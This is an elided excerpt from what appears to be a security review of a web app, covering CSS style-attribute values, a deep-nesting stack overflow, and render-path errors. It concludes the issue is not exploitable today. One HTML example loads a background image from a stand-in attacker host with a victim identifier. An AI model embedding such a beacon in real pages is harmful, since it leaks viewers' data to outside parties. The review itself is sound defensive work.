...
*values* inside `style="..."` — verified directly against the installed
...
```html
<div style="background:url(https://attacker.example/pixel.png?id=victim)">
```
...
*viewed*. SECURITY.md's threat model item 3 is explicitly "the user's trust
...
*parsed* value stack-overflows at approximately 5,000 levels on Node's
...
*before* the tool renders (`src/tools/useShareState.ts:36-38`). SECURITY.md's
...
- "No tool is permitted to throw into the render path" (the error boundary
  catches it, so the *app* survives, but the *tool* still throws — the
...
So this is not exploitable *today*. It's flagged because the attack surface
